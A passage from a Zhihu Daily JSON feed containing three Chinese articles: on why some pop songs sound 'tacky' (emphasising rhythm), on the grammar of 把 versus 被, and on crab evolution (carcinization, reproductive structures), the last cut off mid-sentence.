disco》《沙漠骆驼》等土味神曲的出现告诉我们，土味音乐依然没有消失。</p>\n<p>这些音乐究竟“土”在哪里？为什么总是会有土味音乐诞生呢？</p>\n<p>一首歌的气质，首先肯定是由很多综合要素决定的。</p>\n<p>对于华语歌曲来说，大家往往非常看重歌词，很多歌曲之所以充满土味，通常是因为歌词比较庸俗直白，没有内涵，不符合国人含蓄的审美。比如，我们会认为“还没为你把红豆，熬成缠绵的伤口”的爱是高雅、深沉的表达，而像“老鼠爱大米”一样的爱，就是低俗、肤浅的表达。</p>\n<p>当然，也有一些歌词其实并不算低俗，却依然被大家划分为“土味”歌曲的音乐，比如凤凰传奇的《月亮之上》、《荷塘月色》等等，歌词本身还是很优美的，可我们听起来依然会觉得有点土。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6b05e8bc2a2dab263eb5f3bc61230f84_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以在歌词之外，我们就要来探讨一下这类歌曲的音乐性了。</p>\n<p>通常来说，我们往往会把歌曲的“土”归结为旋律太俗套、编曲配器太低级等原因。这些当然是重要原因，但是我想说，很多人忽略了另一个非常关键的因素：<strong>音乐的节奏。</strong></p>\n<p>我们通常说一首歌是“土”还是“洋气”，主要就是看这首歌是不是偏欧美风，整首歌听起来是否有一种自由飘逸的律动感。而这种感觉，往往就在于音乐的节奏。</p>\n<p>与电影上的节奏感一样，不管剧情、画面多么精彩，如果节奏让人不舒服，那么电影就是有问题的。同理，在音乐上，哪怕旋律很好听、和声很高级，但如果在节奏上<strong>刻板</strong>、<strong>老套</strong>，没有自由畅快的律动感，整首歌也并不会很“洋气”。</p>\n<p>可以想象一下，如果把周杰伦的《菊花台》、《稻香》等名曲换成凤凰传奇最常用的“动次打次”节奏型，是不是瞬间就变得接地气了？</p>\n<p>当然，我知道受限于中文铿锵有力的语言特点，华语歌曲在节奏的创作上总是会遇到很大的阻力。中文独立的单音字，在填到音乐中时，很容易做成“一字一拍”的节奏，从而陷入俗套。</p>\n<p>这样的作品长期占有市场，也导致国人们最常听也是最习惯听的，就是这种一板一眼，传统节奏型的音乐。这其中典型的代表，就是有段时间非常流行的“喊麦文化”，听起来确实洗脑，但同时也成为了“土味”代名词。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-03c65ef549c5049584ac15af0f576e65_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>当然，这并不代表用中文就写不出来节奏高级的作品。</strong></p>\n<p>我们之前多次举过李荣浩和方大同的例子，两首同样是八六拍、抒情悠缓的音乐，方大同的《黑白》比起李荣浩的《老街》，听起来要自由、洋气很多。</p>\n<p>原因就在于方大同能够很大胆地打破汉字与节拍的对应关系，改变歌曲的轻重拍位置；而李荣浩的作品，则是一板一眼将歌词填进了每一个节拍里，听起来朗朗上口，却毫无新意，没有任何想象空间。</p>\n<p>再举个例子说明节奏的重要性：很多土味音乐，旋律、和声不变，单单是改变节奏，同样也会有洋气、高级的感觉。</p>\n<p>华晨宇曾经在《天籁之战》中改编过《老鼠爱大米》，大家可以重点听主歌部分，尽管旋律听起来没什么变化，但改变了节奏的强弱拍位置，也就是用了我们常说的切分音，这个小小的变动，就让一首歌的气质变得年轻、时尚，让之前死气沉沉的节奏变活了，明显有了生命力。</p>\n<p>所以，对于华语音乐来说，想要创作出耳目一新的作品，那就要让歌词最大程度地为音乐服务，而不是让歌词“绑架”音乐的节奏；不要把节奏都写得那么绝对，而应该想办法让音乐流动起来。</p>\n<p>我认为节奏感是最能够代表一个人的音乐感觉的，每个人的节奏感都不尽相同，决定他创作出音乐的气质也不一样。对于音乐创作者来说，应该好好地利用自己与众不同的节奏感，创作出具有独特节奏感的音乐，丰富大家的耳朵。</p>\n<p>当然我相信凤凰传奇并不是写不出来不土的歌，他们只是选择这样的标签、走这样的亲民风格；同时，“土”与“洋气”也没有绝对的高低之分，大家可以有各自的音乐偏好，听得开心就好。</p>\n<p>我只是建议大家，如果想要听懂更多，就要大胆地打开耳朵，去听一听不同节奏的音乐，感受下不同气质的歌曲，而不是停留或沉迷在常见的、单一的节奏里止步不前。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/42224014\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738801"},{"title":"为什么可以说“他被打了”“被他打了”“把他打了”，而不能说“他把打了”?","date":"2021-08-02 23:07:09","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-229d010104de3f152fc878c57e31f064_l.jpg?source=8673f162\"><span>未命名-ICARUS，</span><span>这是我自己的信息茧房，欢迎作客，不欢迎随地大小便</span>\n<a href=\"https://www.zhihu.com/question/434441847/answer/2023941916\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我想从词类的角度解释这个问题，我写论文时注意到了这个情况，不过首先还是需要将题主的题干重新梳理一下：“他被打了”和“被他打了”账面上是换了一下两个字的位置，实际上是两个不同层级的结构，不应该放在一起比较，应该将“被打了”和“被他打了”比较，提炼一下就是：为什么“被 +NP+VP”<sup>[1]</sup>和“被 +VP”都是可以的结构，而“把 +NP+VP”可以，“把 +VP”却不太成立。</p>\n<p>首先，如果你查阅最权威的《新华字典》，会发现这“把”和“被”这两个字都被归类为“介词”。但我并不认同《新华字典》的分类，我认为这个分类是偏保守的，可能更多地是为了教学方便，而没有特别在意从语言学的角度进行考察。我的结论是，现代汉语中，“被”是一个<strong>助动词</strong>，而“把”<strong>主要</strong>是个<strong>介词</strong>。词类上的区别可以非常轻易解答题主的问题。</p>\n<p>我的考量非常简单，我们可以检查把字句和被字句的各种句法特征，首先我们会发现它们并不太一样，然后我们可以把它们和其他我们姑且可以认为是某类词汇的“范例”的词进行比较，看看“把”和“被”到底更像谁一点。这也是大部分汉语词类划分研究使用的方法，从赵元任（1968），到郭锐（2018），大抵都是这个办法。</p>\n<p>我们可以列举其他把字句和被字句的细微区别，比如，把字句和被字句和副词的关系并不一样。</p>\n<div><code>他被打了。 他肯定被打了。 * 他被肯定打了。 </code></div>\n<p>这一组例子可以证明，“被”字之前是唯一可以安放“肯定”、“也许”这类“态度副词”的位置，所以“肯定”修饰着“被”字结构。但把字句却不太一样，由于“把 +NP”一定程度上是可以作为一个整体被位移的，我们可以发现副词并不能以“把 +NP”作为补足语：</p>\n<div><code>你把这棵菜切了。 你把这棵菜赶紧切了。 把这颗菜，你赶紧切了。 * 赶紧把这颗菜，你切了。 </code></div>\n<p>类似于副词，把字句和被字句和否定词的关系也太不一样：</p>\n<div><code>张三没被李四打。 * 张三被李四没打。 张三没把李四打死。 ？张三把李四没打死。（这句话的接受度可能会有争议，但我个人认为比对应的被字句好很多，可能需要更多的语境） </code></div>\n<p>被字可以单独用作回答（尤其是否定回答），但把字不可以：</p>\n<div><code>张三被李四打了吗？ 没被。（这句话的接受度也许也会有争议点） 张三把李四打了吗？ * 没把。 </code></div>\n<p>我于自己的论文中还总结了介词和动词的其他句法区别，具体情况如表所示<sup>[2]</sup>：</p>\n<table><tbody>\n<tr>\n<th> </th>\n<th>被</th>\n<th>把</th>\n</tr>\n<tr>\n<td>单独回答问题</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>被否定</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>被副词修饰</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>和态度副词的位置关系</td>\n<td>×</td>\n<td>√</td>\n</tr>\n<tr>\n<td>和方式副词的位置关系</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>体助词</td>\n<td>×</td>\n<td>×</td>\n</tr>\n<tr>\n<td>位移其后的 NP</td>\n<td>×</td>\n<td>×</td>\n</tr>\n<tr>\n<td>省略其后的 NP</td>\n<td>×</td>\n<td>×</td>\n</tr>\n</tbody></table>\n<p>从这个表中我们可以发现，“把”字和“被”字并不一样，那么它们的句法特征更像什么呢？请参考下表，其中列举了几个词类上没有争议的词的情况：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4cf36347fa094b0a6f151c27b1e45599_720w.jpg?source=8673f162\" alt=\"\"></figure><p>（其中，adverbs 指结构能否单独作为副词的补足语，adverb position 指结构和不同类型的副词的位置关系，aspectual marker 指能否被体助词（“了”、“着”）修饰，dislocation 指后面的 NP 能否被位移，omission 指后面的 NP 能否被省略（实际上，由于我们会发现把字句和被字句根本不是相同的结构，讨论它们的 NP 能否被位移和省略，纯粹是讨论表层结构的情况。）</p>\n<p>通过对比我们发现，“被”像助动词“使”，而“把”则更像介词“从”。结构上，“把”和其后 NP 形成一个介词短语，而“被”要求后面是一个从句。这个从句是无所谓有没有主语的，这个特征允许“他被（某人）打了”，而介词“把”需要它的补足语是被指明、留在原位的，所以“你把他打了”中的“他”必须出现。</p>\n<hr>\n<p>不过这是一定的吗？我个人有不同的看法。由于前段时间写论文的缘故，我在日常生活中会非常注意各种各样的人使用虚词的情况。虽然例子不多，但我偶尔确实会发现人们会无意识地将“把”字单独使用。举个例子：</p>\n<div><code>那个水，你把递我一下。 衣服你把洗了吗？ </code></div>\n<p>我不想消极地将类似的情况理解为单纯的病句，我认为汉语介词是有进一步发生语法化的趋势的，其中最典型的情况是“给”。在这里我必须简单说一下，什么是<strong>语法化</strong>呢？简单来说，语法化指一个语言学因素从语法状态比较低的情况变化为比较高的情况（参考 Kuryłowicz 1976 的定义）。这个定义还是比较抽象，我们以“把”字为例，来解释这个问题。</p>\n<p>首先，以我们的文言文知识，我们知道“把”在古代汉语中，是有动词含义的，即“拿、抓”，这个含义类似于现代汉语一些不太常用的词组里的含义，比如“把持”、“把住”等。这个例子经常出现在学术作品中：</p>\n<div><code>禹亲把天之瑞令以征有苗 《墨子》 禹亲自手持天符令，来讨伐三苗部落 </code></div>\n<p>“把”字经常用于联动结构中，这种结构在古汉语中就很常用了，比如：</p>\n<div><code>悉发国人操刀把杖以击之 《论衡》 派遣所有国民操持刀具、手持棍杖去攻击它 </code></div>\n<p>在这个句子中，“把”杖的“把”仍然是本义，和另一个动词“操”并列放在一起。某些动词在联动结构的广泛，给了人们充足的重新理解句子结构的机会，最终达成再分析，完成这些动词在这一阶段的语法化过程。在《论衡》的例子后，一个经典的例子来自杜甫的诗句：</p>\n<div><code>醉把茱萸仔细看 1. 我喝醉了，拿来狗尾巴草仔细地看 2. 我喝醉了，仔细看狗尾巴草 </code></div>\n<p>理论上，这两个解释都是说得通的。解读（2）产生的条件是，动词“把”的宾语和后面动词（这里是“看”）的宾语为同一个，以及“把”这个动作是否明显、可以被察觉。这种模棱两可的情况越多，产生再分析的机会就越多，最终人们再也不把同样浅层结构里的“把”当成是一个动词，而完全变成了一个标记处置对象的介词——表抓、拿的动词变化为表处置的介词这一阶段的语法化就完成了，也就变成了现代我们用的用法。</p>\n<p>（所以，在这里我必须再次吐槽，喊麦神曲里面的“醉把佳人成双对”完全惊悚——“一人我饮酒醉”，主语是我，然后“醉把佳人成双对”，我没有理由理解主语变换，所以作“我抓住了佳人，使他们配对”？这也太鬼畜了。）</p>\n<p>语法化有一个经典的理论模型，即“语法化渐变”Givón (1979: 209)，Hopper 和 Traugott (2003: 7)，以及 Lehmann (2015: 173)：</p>\n<div><code>content item 实义词 &gt; grammatical item 语法功能词 &gt; clitic 附着语素 &gt; inflectional affix 屈折词素 (&gt; ∅ 消失) </code></div>\n<p>所以对于“把”来说，它在语法化的路上刚走完第一步——实义动词变成语法功能词（介词）。由于它是一个非常高频使用的词汇，我们可以期待它向下一步迈进。在词类上，我们可以类比的是一个印欧语的概念“动词前置词”（preverb）。广义上来讲，所谓的“动词前置词”包含了介词这个词类，它比介词多的一个特征是，“它可以”单独和动词一起产生更紧密的关联（Booij and Kemenade 2003: 1）。印欧语中，我们可以发现一大批和介词同源的动词前缀，它们都可以归类为“动词前置词”。</p>\n<p>“把”很有可能在介词的基础上，向更广义的“动词前置词”发展，如图：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3bef6182fa9a4a2290e038e9f3641e0f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>语法化渐变的理论模型似乎可以解释我们在日常生活中，在“把”后名词已经在语境中被明确的情况下，偶尔也会将“把”单独使用，直接和动词并列。</p>\n<p><sup>[3]</sup><sup>[4]</sup><sup>[5]</sup><sup>[6]</sup><sup>[7]</sup><sup>[8]</sup><sup>[9]</sup></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/434441847\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738779"},{"title":"有谁能彻底解说一下螃蟹的演化史?","date":"2021-08-02 23:07:01","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d6653ee8bd49ca3b200a5dbbcb2c5b42_l.jpg?source=8673f162\"><span>环形剧场现任负责人，</span><span>不回答斗兽/变相斗兽(XX为啥能/不能成为地球霸主)相关问题</span>\n<a href=\"https://www.zhihu.com/question/463482216/answer/2034118461\" hidden>阅读原文</a>\n</div>\n<div>\n<p>……我不确定题主要的“彻底”是有多彻底，像 <a href=\"http://www.zhihu.com/people/3cdca73e2c60bb871e149d857cdd0ca5\">@古明地恋</a> 的头足传那样巨细靡遗，照顾到每个大小分支的介绍，恐怕不是我这一个小小回答能容下的(´△｀)</p>\n<p>所以退而求其次，这篇回答是囊括了作者所认为的，蟹类演化中几个<strong>重要</strong>事件的“简史”，而这些重要事件可能和题主最初的设想大相径庭，分类学家关心的差异往往没有那么的“显而易见”，而从千万年的尺度上看，外观上各种乖张的犄角棘刺的变化大都只是些细枝末节而已</p>\n<p>不过，本篇回答中的许多内容可能是第一次出现在简中互联网上，笔者将会尽自己所能为各位读者展现，这些餐桌上的大菜在它们自己的历史中经历了怎样曲折而激动人心的历程，又在哪些地方与那些本早已异路殊途亿万年的异邦人们遥相呼应，殊途同归。笔者有自信不会让题主失望的</p>\n<p>那么，开始吧</p>\n<p>* 除非特别提及，下文中的“蟹”全部指代短尾下目<em>Brachyura </em>下的物种，不涉及椰子蟹、瓷蟹、石蟹(帝王蟹)等异尾下目<em>Anomura</em> 下的物种</p>\n<hr>\n<p><strong>一切的开始：蟹化</strong><strong>引子：Eoprosopon klugi</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-df5630fad5539fbff6090d04d6912a86_720w.jpg?source=8673f162\" alt=\"\"><figcaption>艺术家 Franzanth 绘制的 Eoprosopon klugi 的复原图</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-0cfa5ac965e7df65ce548c7eec9adfa8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Eoprosopon klugi 的化石</figcaption></figure><p>在学术上，“螃蟹”一词所指代的是一个名为“短尾下目”<em>Brachyura</em> 的庞大演化支。“短尾”指的是它们的蟹脐，一段萎缩并折到胸甲下的腹部。也许你已经听说过，蟹是由虾进化来的，或者在支序分类学里干脆就是一类虾，就如同鸟在这一分类法下是一类恐龙那样</p>\n<p>虽然看上去不大像，上图中的物种，出土于中侏罗世巴通阶地层的<em>Eoprosopon klugi</em>，是已知最早的短尾下目成员。与它同一地质时期被发现的蟹类化石物种可归入至少三个科两个总科<sup>[1]</sup>。是不是和一般印象里的螃蟹不大一样？化石证据显示，短尾下目最早诞生于侏罗纪早期，也就是说螃蟹是一群比恐龙还要年轻的生灵。之后发现于侏罗纪地层中的蟹类也不过廖廖十余种，而这或许与它们那时似蟹非蟹的形态有着千丝万缕的联系：耗费了整个漫长的侏罗纪，进化用五个千万年，为短尾下目塑造了那让蟹之所以为蟹的，蟹类进化史上开天辟地的第一次进化创新：蟹化</p>\n<p><strong>蟹化</strong></p>\n<p>在螃蟹的历史中，蟹化 carcinization 是最初也是最重要的一次进化事件，它的完成标志着短尾下目从此正式作为一个演化类群登上历史舞台。这一名词最早由 Borradaile 在 1916 年提出，最初是特指<strong>物种腹部萎缩折叠，背甲横向拉伸并扁平化的现象</strong>。用 Borradaile 本人的话说，“大自然尽其所能去创造一只螃蟹”</p>\n<p>对蟹化的现有定义如下：</p>\n<ul>\n<li>背侧的头胸甲扁平化并横向拉伸，出现棱角与边缘</li>\n<li>位于头胸甲的相对位置，即腹面的几片腹甲融合成一片被称为胸铠(plastron)的单一甲壳</li>\n<li>腹部萎缩、扁平化、弯折入头胸部下方，视种类的不同，弯折的腹部可能会部分或完全地覆盖胸铠</li>\n<li>第六体节的附肢（这一段的附肢最常见的变形就是各种虾的“扇尾”)显著退化或消失</li>\n<li>腹部神经节的融合及腹部肌肉的退化</li>\n</ul>\n<p>或者简单地说，蟹化就是一辆货车丢掉了拖车，加固了底盘，活生生转职为一辆铁皮坦克。现存蟹类的姊妹群大多营潜沙掘穴的生态位，可以猜测蟹的祖先最初占据的也是类似的生态位，而蟹化则应该是带领它们从中脱出的一种增强物种适应广度的进化，<strong>蟹形体态的物种获得的生存优势就是相对于那些虾形体态的姐妹群而言的</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b127165307216e1923833706138ca925_720w.jpg?source=8673f162\" alt=\"\"><figcaption>蟹类的姊妹群，甲虾下目美人虾科的 Pestarella tyrrhena，头小肚子大，已经不能像虾或龙虾那样自如地游泳，只能躲在泥沙之下。螃蟹的远古祖先可能就是这么个姿态</figcaption></figure><p>以蟹化现象的焦点，萎缩并折叠在胸甲下的腹部为例：海蛄虾与蝼蛄虾臃肿的腹部失去了虾型体态依靠弹尾爆发逃生的能力，反而成了易受攻击，妨碍正常运动的遗毒。如果蟹类的早期祖先是类似海蛄虾的动物的话，那么处理这条累赘就能在底栖生活中获得更高的机动性。而蟹类的解决之道则是“抛弃”腹部：<strong>它们的腹部萎缩折叠在胸甲下，可以保护其免受捕食者</strong>、<strong>同类及危险猎物的袭击</strong>，同时使身体移动时的力矩减小，重心降低，还节省了一部分本要供给到腹部的能量，步足的排列方式也得以重塑，使得蟹类在日常活动中更加灵活敏捷……蟹形体态可能是甲壳类探索出的一种有别于虾形的泛用架构</p>\n<p><a href=\"https://www.zhihu.com/answer/1829528853\">知乎 - 有问题，就会有答案</a></p>\n<p>更多关于蟹化的细节，可以参考链接中笔者的往期回答。这里只需注意，蟹化后的动物们虽然赢得了个体的生存优势，但底栖生活改变的除了生存环境，还有遭遇配偶的概率。来日将要漫步海底的半蟹们此刻还需要一套与过去截然不同的交配和生殖策略，所以伴随着蟹化的，还有自然选择对来自祖先的生殖系统的改动</p>\n<hr>\n<p><strong>生殖改良：原蟹与真蟹</strong><strong>引子：面包蟹的拥抱</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7b7e63366a5dd574234ddd339e6183a7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一对火焰馒头蟹 Calappa flammea</figcaption></figure><p>曾经有一段时间，这些面包蟹们相拥而行的场面传遍了大半个简中互联网平台，而经由某藏狐点破后，那些照片或视频中的雄蟹的风评也经历了从“暖男”到“渣男”的一百八十度大转变</p>\n<p>这种抱着雌蟹，等待其蜕皮后立即交配的行为在学术上称作“软壳交配”，目前认为是一种从祖先身上继承下来的行为。雌蟹在要蜕皮时会向水中散逸蜕皮素等信息素，性成熟的雄蟹嗅到后会寻迹赶到雌蟹身边，在其蜕皮前一直用这种姿势保护雌蟹，蜕皮后立刻交配，并在交配后继续保护雌蟹直至外壳完全硬化</p>\n<p>在这种软壳交配中，双方都能获得好处：蜕皮及其后的软壳期本就是每一只节肢动物都要反复经历的最为凶险的时期，但在软壳交配中，蜕皮期及软壳期的雌蟹得到雄蟹的保护，生还率大大提高；而雄蟹也间接提高了本次交配后自己的基因成功传递下去的可能。相对的，硬壳交配的蟹类失去了由这一信息素介导的“保护协议”，蜕皮后的软壳雌蟹可能就被同类无情捕食了</p>\n<p>但这里想要强调的，是软壳交配在原初蟹类身上的另一重重要意义：让雄蟹能够在雌蟹下一次蜕皮前尽早与之交配，交配时间与距离下一次蜕皮时间越长，雄蟹成功传递基因的可能性就越大。要说这是为什么，甲壳类动物的蜕皮与繁殖之间有着很深的羁绊，而这份羁绊同时也催生了继蟹化之后，螃蟹进化史上的又一项重要的进化创新</p>\n<p><strong>蜕皮，肢孔类与精子短缺</strong></p>\n<p>一个事实是，<strong>在十足目类群内部，只有短尾下目的真蟹派实现了真正的体内受精</strong>，这一性状很可能是受蟹化事件驱动，与蟹化同步发生的。</p>\n<p>十足目可分为枝鳃亚目和抱卵亚目，枝鳃亚目的物种以对虾为代表，拥有树枝状的鳃，雌性在交配后直接将受精卵释放在水中；而抱卵亚目的卵在受精后，依然会被雌性保存在由游泳足特化而来的携卵足中营造一个稳定的发育环境，孵化率因此显著提升；一些物种甚至已经进化出了广义上的纳精囊——在两个体节的结合部位或单个体节上形成的凹陷<sup>[2]</sup>。但到此为止，<strong>受精的场所和作为输卵管开口的雌孔都一直是分离的</strong>，卵细胞依然要先排出体外，附着到携卵足上，然后才能与从纳精囊中释放出的精荚接触，继而完成受精</p>\n<p><strong>【此处应有图】</strong></p>\n<p>目前认为，蟹类转向底栖生活的过程中，受到的最大选择压来自于精子供应量的改变：<strong>十足目暴露于体外的纳精囊事实上是体表外骨骼的一部分，所以在雌性蜕皮时收纳于其中的精荚会与纳精囊一同脱落，无法长期保存</strong>。这对虾类而言并不是多大的问题，作为一种半游泳动物，它们有充足的机会接触异性，大可以增加交配次数来弥补精子单次存量小，保存期短的弊端；但底栖生活使得雌性在相同时间内能够接触到的潜在交配对象变少，那<strong>延长精子的储存时间及存储量</strong>就成为了完成蟹化所必须要面对的课题</p>\n<p>话虽如此，早期的蟹类同样沿用着卵巢与纳精囊分离的构造，因为蟹化让原本分成几片的腹甲愈合为一整片胸铠，输精管与输卵管的开口便移动到步足的基部，在中侏罗纪就出现的肢孔类（podotreme, podo-\"足\" + trema\"孔洞\"，该分类可能为多系群）依然保留了这样的结构。现存的肢孔类有三个分支：绵蟹派<em>Dromiacea</em> 、蛙蟹派<em>Raninoida</em> 以及圆关公蟹派<em>Cyclodorippoida </em>，它们的纳精囊依旧是外骨骼内陷式的“spermatheca”，纳精囊里的精子依然会在下一次蜕皮时被尽数抛弃。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a5b1a5f042a026372ebc935a30a70393_720w.jpg?source=8673f162\" alt=\"\"><figcaption>绵蟹派下的物种，比如图中的 Dromia personata，会驮负海绵来伪装自己</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-7355c8f9620fa6f55187a1bd1ae03d47_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一只正在蜕皮的蛙蟹 Ranina ranina</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-8389388ca57ed185c81ac02cf4fbd60a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>圆关公蟹派，波纹蟹属的 Cymonomus chani，与真蟹派下的关公蟹总科趋同进化</figcaption></figure><p>与哺乳动物中的有袋类一样，位于短尾下目基干位置的肢孔类也曾有过属于自己的辉煌岁月。在整个白垩纪，肢孔类在大范围的辐射进化中占有整个十足目的半壁江山。作为昔日盛世的遗迹，肢孔类直到今天也还残留有一些在形态上与大众熟知的螃蟹种类十分相似的物种，在后来居上的真蟹类中，许多物种的形态都十分类似这些或灭绝或幸存的前辈们</p>\n<p>然而这些先行者们究竟是没落了。遭遇配偶的几率减少以及蜕皮损失精子的问题使得得这些原初蟹类后代的数量与基因多样性大大下降，天地不仁，只有足够丰富的基因库，才能在这场永不休止的大逃杀中为一个种族增添一份生的希望。所以蟹类依旧需要一个克服底栖环境下精子短缺的方案，一个能带着未来后代们一半的遗传因子飞越蜕皮周期的时光胶囊，一个“受精囊”（seminal receptacle）</p>\n<p><strong>真蟹类与受精囊</strong></p>\n<p>这个开创性的结构大致与蟹化在同一时间形成，关键性地形成了真蟹派<em>Eubrachyura</em> 演化支，一个涵盖了几乎所有大众所熟知的短尾下目物种的类群。这个类群最突出的特点就是<strong>雌性的生殖孔不是开在步足基部而是在胸板上</strong>，而<strong>纳精囊也已内化为输卵管的一部分</strong>。目前我们依然没有发现生殖孔位置处在肢孔派与真蟹派之间的过渡化石，因此只能猜测：真蟹类祖先的生殖孔依然开在步足基部，而它们的纳精囊则与其他十足目类群一样，始于体表外骨骼的内陷</p>\n<p>蟹化的主要过程：头胸甲的横向拉伸，使得<strong>雌性生殖孔间的距离被拉大</strong>；同时腹部的萎缩收窄又使雄性的交接器无法与仍位于胸甲两端的雌性生殖孔对接，这让自然选择更青睐那些<strong>生殖孔往胸甲中央靠拢的雌性</strong>。但这表皮开口的位置变化并没有看上去那么简单，尤其考虑到螃蟹是体表缺乏弹性的节肢动物，又是其中外骨骼最硬而脆的软甲纲<sup>[3]</sup>，因此主流理论中设想的演化历程要比想象中曲折得多。但在整个过程中，<strong>蟹化导致的雌雄生殖孔位置不匹配</strong>始终是驱动受精囊形成的主要选择压：</p>\n<ol>\n<li>在最初阶段，交接器够不到雌孔的雄蟹只能将精荚安放在靠近雌孔的地方；</li>\n<li>如果这时雌孔周围的胸甲因为某些突变而内陷，安置于此的精荚就获得了一定的保护；</li>\n<li>而比起凹坑，口袋状的结构又使精荚不易脱落，于是凹陷的边缘又在自然选择中开始收拢；</li>\n<li>最后，由于交配器官对接的需求，袋口随着进化逐渐收束成的阴道开口歪到了胸甲的中央</li>\n</ol>\n<p>我们今天所见的生殖孔并非祖先遗留下的那个仅用作排出未受精卵的输卵管开口，而是进化产生的，作为精子与卵细胞的共用通道的次生孔</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-688f5e9fbc73a8509de0733fda0a18f7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>受精囊的形成及雌蟹生殖道开口迁移过程的简图</figcaption></figure><p>* <em>要澄清的一点是，受精囊里的所谓“受精”实际上只是一个或数个精子附着在了包裹着卵母细胞的包膜（oocyte envelope）上，后续的顶体反应刺破包膜，钻入胞质，以及我们一般认知中的受精，则要等到这团配子混合物被一路转移至雌蟹腹部的孵化腔（brood chamber）内，转移到携卵足上时才发生——整个过程通常需要 30~90 分钟</em></p>\n<p>这曲折历程是值得的——蜕皮是表皮细胞的活动，表皮细胞则是外胚层的产物，<strong>与源自中胚层的性腺孔的对接使得真蟹的受精囊有一部分区域由中胚层而非外胚层发育而来，这就意味着真蟹的受精囊中需要与身体一同蜕皮的部分只有贴近生殖孔的外胚层区，靠近内部的精子就不会随着蜕皮而被排出，一些种类甚至能保持精子活性长达四年之久</strong>；柔软的中胚层组织赋予受精囊强大的延展性，增大了受精囊的容积，真蟹类雌蟹获得了比肢孔类雌蟹更高的生殖自主权，这可能为真蟹类后来的多样化奠定了基础</p>\n<p>有了受精囊，性选择开始在香火日益兴旺的真蟹类中花上更多的小心思，使得真蟹们衍生出愈发复杂的生殖器官和交配模式。除了本章开头提及的软壳交配，硬壳交配，雌蟹雨露均沾的分格式受精囊，雄蟹堵塞雌蟹生殖孔的阴道栓……任何事情一旦涉及性就会复杂得叫人望而生畏，所以关于进一步的生殖策略这里就不继续展开了</p>\n<p>不过在这种类繁多的生殖进化中，还有一个值得在蟹类演化史上留一笔的进化事件，那就是<strong>真蟹派内部根据雄性生殖孔在体表的位置差异分成的两个单系群</strong>：雄性的生殖孔位于腿部的异孔亚派<em>Heterotremata</em> ，以及生殖孔无论雌雄都位于胸板上的胸孔亚派<em>Thoracotremata </em>，前者是如日中天的十足目第一大家族，后者则可能包含了短尾下目乃至整个十足目中最聪明的物种</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0001943673862d33ad190c4da1c2bb60_720w.jpg?source=8673f162\" alt=\"\"><figcaption>肢孔类、异孔亚派及胸孔亚派雌雄生殖孔的所在部位</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-63265713d3049a672334967d8739e73e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>梭子蟹是异孔亚派的代表物种，图为优游蟹属某种</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-964cc7e3bcfbfad68e14ba019a9da3f2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>其实现在学术界对胸孔亚派行为的研究不多，笔者说它们聪明是因为……您瞧这大眼睛看着多机灵啊对吧~</figcaption></figure><p>现存的肢孔类只有 10 科 380 种，而真蟹类有 83 科 6420 种，后者的蟹形体态与内化的受精囊最晚在白垩纪早期<sup>[4]</sup>落成。在基干蟹类的王朝与整个中生代一同轰然落幕后，接下来的演化史就是真蟹们的故事了</p>\n<hr>\n<p><strong>脉搏、反转与蟹类革命</strong><strong>引子：迷惑丽魔蟹<sup>[5]</sup></strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f12fef46725eea9e448ff325b10c94d8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一块迷惑丽魔蟹的化石，大概五毛硬币大小</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-632b1171883364f1b292f32e65d34160_720w.jpg?source=8673f162\" alt=\"\"><figcaption>艺术家绘制的迷惑丽魔蟹的复原图</figcaption></figure><p>这个奇异的物种出土于白垩纪的地层中，大小从几毫米到两厘米不等。硕大的复眼，梭形的身体，它们身上的这些特征都不似一只成体的螃蟹，反而更接近大眼幼体时期的幼蟹；另外值得一提的是它的泳足，自板足鲎类灭族一亿六千万年后，这种用于游泳的高度特化的桨状足首次再现于节肢动物家族，这暗示着这个物种可能是蟹类中罕有的<strong>活跃于中上层水域的自由游泳者</strong></p>\n<p>这个硬币大小的小妖精被命名为迷惑丽魔蟹 <em>Callichimaera perplexa </em>，作为蟹类的早期分支之一，研究人员认为迷惑丽魔蟹叫人惊诧的形态可能是幼态延续，即将本应只出现在幼年阶段的性状保留到成年的结果</p>\n<p>迷惑丽魔蟹是白垩纪蟹类爆炸性辐射的一个缩影。作为中生代海洋生物革命(Mesozoic Marine Revolution)的一部分，短尾下目的物种数量在白垩纪迎来了一轮爆发式增长，80%的现存蟹类物种诞生在这一时期，史称“白垩纪蟹类革命”(Cretaceous 